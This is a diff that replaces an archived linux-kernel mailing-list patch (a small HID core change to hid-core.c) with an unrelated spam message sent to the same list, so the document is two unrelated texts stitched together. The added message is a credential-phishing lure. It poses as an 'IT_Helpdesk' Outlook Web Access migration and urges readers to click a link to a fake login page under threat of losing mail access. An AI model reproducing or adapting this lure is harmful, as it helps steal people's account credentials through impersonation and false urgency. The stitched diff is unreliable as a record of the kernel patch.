@@ -1,49 +1,44 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753642AbaI3RXR (ORCPT <rfc822;w@1wt.eu>);
-	Tue, 30 Sep 2014 13:23:17 -0400
-Received: from mx1.redhat.com ([209.132.183.28]:12667 "EHLO mx1.redhat.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1752474AbaI3RSr (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 30 Sep 2014 13:18:47 -0400
-From: Benjamin Tissoires <benjamin.tissoires@redhat.com>
-To: Jiri Kosina <jkosina@suse.cz>,
-        Nestor Lopez Casado <nlopezcasad@logitech.com>,
-        Andrew de los Reyes <andrew-vger@gizmolabs.org>
-Cc: linux-kernel@vger.kernel.org, linux-input@vger.kernel.org
-Subject: [PATCH 02/13] HID: core: do not scan reports if the group is already set
-Date: Tue, 30 Sep 2014 13:18:24 -0400
-Message-Id: <1412097515-17241-3-git-send-email-benjamin.tissoires@redhat.com>
-In-Reply-To: <1412097515-17241-1-git-send-email-benjamin.tissoires@redhat.com>
-References: <1412097515-17241-1-git-send-email-benjamin.tissoires@redhat.com>
+	id S1752776AbaI3RZv (ORCPT <rfc822;w@1wt.eu>);
+	Tue, 30 Sep 2014 13:25:51 -0400
+Received: from exchange.fbconcord.org ([69.128.189.170]:62137 "EHLO
+	mail00.baptist.local" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+	with ESMTP id S1751738AbaI3RZu convert rfc822-to-8bit (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Tue, 30 Sep 2014 13:25:50 -0400
+X-Greylist: delayed 317 seconds by postgrey-1.27 at vger.kernel.org; Tue, 30 Sep 2014 13:25:50 EDT
+From: Sonya Wright <swright@fbconcord.org>
+To: Sonya Wright <swright@fbconcord.org>
+Subject: RE: 
+Thread-Index: Ac/cu+j5NqJ1fl3gRDS60pnRgydx6AAFs6rs
+Date: Tue, 30 Sep 2014 17:20:27 +0000
+Message-ID: <5633293EA8BBC640804038866F5D329F1066D2@mail00.baptist.local>
+References: <5633293EA8BBC640804038866F5D329F0B3A17@mail00.baptist.local>
+In-Reply-To: <5633293EA8BBC640804038866F5D329F0B3A17@mail00.baptist.local>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach: 
+X-MS-TNEF-Correlator: 
+x-originating-ip: [41.58.72.158]
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
+MIME-Version: 1.0
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-This allows the transport layer (I have in mind hid-logitech-dj and uhid)
-to set the group before it is added to the hid bus. This way, it can
-bypass the hid_scan_report() call, and choose in advance which driver
-will handle the newly created hid device.
 
-Signed-off-by: Benjamin Tisssoires <benjamin.tissoires@redhat.com>
----
- drivers/hid/hid-core.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
+________________________________
+From: Sonya Wright
+Sent: Tuesday, September 30, 2014 10:36 AM
+To: Sonya Wright
+Subject:
 
-diff --git a/drivers/hid/hid-core.c b/drivers/hid/hid-core.c
-index 6cfecb8..f4323d2 100644
---- a/drivers/hid/hid-core.c
-+++ b/drivers/hid/hid-core.c
-@@ -2532,7 +2532,8 @@ int hid_add_device(struct hid_device *hdev)
- 	 * Scan generic devices for group information
- 	 */
- 	if (hid_ignore_special_drivers ||
--	    !hid_match_id(hdev, hid_have_special_driver)) {
-+	    (!hdev->group &&
-+	     !hid_match_id(hdev, hid_have_special_driver))) {
- 		ret = hid_scan_report(hdev);
- 		if (ret)
- 			hid_warn(hdev, "bad device descriptor (%d)\n", ret);
--- 
-2.1.0
+IT_Helpdesk is currently migrating from old outlook to the new Outlook Web access 2014 to strengthen our security.  You need to update your account immediately for activation. Click the website below for activation:
 
+Click Here<http://alufelniakcio.com//js/owa343/index.htm>
+
+You will not be able to send or receive mail if activation is not complete.
+
+IT Message Center.
